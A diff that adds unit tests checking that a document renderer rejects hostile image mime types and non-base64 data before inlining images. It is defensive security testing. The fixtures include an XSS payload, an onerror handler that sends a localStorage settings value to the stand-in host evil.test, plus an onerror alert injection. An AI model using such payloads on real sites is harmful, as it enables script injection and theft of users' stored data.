@@ -4,6 +4,7 @@ import type { ProjectDocument } from "./document-model";
 import type { Workspace } from "./workspace";
 import type { DocumentAsset } from "./document-asset";
 import { PRINT_STYLES } from "./download";
+import { ASSET_MIME_ALLOWED } from "./document-asset-upload";
 
 // A Workspace has ~30 required slices and this renderer reads only the ones the
 // section builders touch, so one narrow cast beats constructing the whole shape.
@@ -443,5 +444,66 @@ describe("renderDocumentHtml — S3c-1 image inlining", () => {
     expect(html).toContain('data-asset-missing="true"');
     expect(html).not.toContain("src=");
     expect(html).not.toContain("base64");
+  });
+});
+
+// ★★★ The `mime` and `data` reaching the renderer come off the LOAD path, where
+// `sanitizeDocumentAsset` runs mime through `sanitizeText` — which only trims
+// and clips. It strips no quote and never consults the upload allowlist, so a
+// hostile project file can carry an attribute-breaking mime. These assert on the
+// PARSED result, never on a substring of the raw HTML: a raw-string assertion is
+// exactly the class of test that would let an injected `onerror` ship green.
+describe("renderDocumentHtml — S3c-1 image inlining is validated at the SINK", () => {
+  function assetMeta(id: string, mime: string): DocumentAsset {
+    return { id, name: `${id}.png`, mime, size: 3, hash: "h", createdAt: "2026-08-06T00:00:00.000Z" };
+  }
+
+  const withImage = [{ type: "paragraph", html: '<p><img data-asset-id="a1" alt="Sunset"></p>' }] as const;
+
+  /** Parse the rendered standalone HTML and hand back the asset <img>. */
+  function renderedImg(mime: string, data: string): HTMLImageElement {
+    const wsWithAsset = { ...ws, documentAssets: [assetMeta("a1", mime)] } as Workspace;
+    const html = renderDocumentHtml(doc([...withImage]), wsWithAsset, "en-US", "standalone", { a1: data });
+    const host = document.createElement("div");
+    host.innerHTML = html.slice(html.indexOf("<body>") + "<body>".length);
+    const img = host.querySelector("img[data-asset-id]");
+    expect(img).not.toBeNull();
+    return img as HTMLImageElement;
+  }
+
+  it("renders the data: URI for an allowed mime", () => {
+    const img = renderedImg("image/png", "QUJD");
+    expect(img.getAttribute("src")).toBe("data:image/png;base64,QUJD");
+    expect(img.getAttribute("data-asset-missing")).toBeNull();
+  });
+
+  it("renders every mime the upload allowlist admits", () => {
+    for (const mime of ASSET_MIME_ALLOWED) {
+      expect(renderedImg(mime, "QUJD").getAttribute("src")).toBe(`data:${mime};base64,QUJD`);
+    }
+  });
+
+  it("falls through to data-asset-missing for a quote-injection mime, minting no event handler", () => {
+    const hostile =
+      `image/png" onerror="fetch('https://evil.test/'+localStorage.getItem('aipm-cockpit:settings'))`;
+    const img = renderedImg(hostile, "QUJD");
+    expect(img.getAttribute("onerror")).toBeNull();
+    expect(img.getAttribute("src")).toBeNull();
+    expect(img.getAttribute("data-asset-missing")).toBe("true");
+  });
+
+  it("falls through for image/svg+xml — escaping alone would still leave an XSS surface", () => {
+    // The upload allowlist excludes SVG; the load path does not, so the sink
+    // must exclude it independently.
+    const img = renderedImg("image/svg+xml", "QUJD");
+    expect(img.getAttribute("src")).toBeNull();
+    expect(img.getAttribute("data-asset-missing")).toBe("true");
+  });
+
+  it("falls through when data is not base64 — the Turso column validates no charset", () => {
+    const img = renderedImg("image/png", `AAAA" onerror="alert(1)`);
+    expect(img.getAttribute("onerror")).toBeNull();
+    expect(img.getAttribute("src")).toBeNull();
+    expect(img.getAttribute("data-asset-missing")).toBe("true");
   });
 });
